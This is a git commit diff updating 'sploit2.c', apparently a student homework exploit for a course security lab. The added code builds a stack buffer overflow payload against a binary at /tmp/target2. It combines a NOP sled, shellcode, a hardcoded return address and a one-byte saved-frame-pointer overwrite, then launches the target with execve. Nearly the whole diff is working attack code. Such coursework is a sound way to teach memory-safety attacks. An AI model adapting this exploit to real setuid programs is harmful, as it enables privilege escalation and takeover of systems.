9357b097432c48c71383110e382c343c9d58d447
Shawn Zhong <github@shawnzhong.com>
2020-04-11 23:08:04 -0500

    Update sploit2.c

--- HW4/sploits/sploit2.c
+++ HW4/sploits/sploit2.c
@@ -1,17 +1,25 @@
+#include "shellcode.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include "shellcode.h"
 
 #define TARGET "/tmp/target2"
+#define NOP 0x90
 
-int main(void)
-{
+int main(void) {
   char *args[3];
   char *env[1];
+  char buf[162];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  memset(buf, NOP, 161);
+  strcpy(buf + 156 - strlen(shellcode), shellcode);
+  strcpy(buf + 156, "\x28\xfd\xff\xbf" // expected eip
+                    "\xc0");           // overflow to sfp
+
+  args[0] = TARGET;
+  args[1] = buf;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
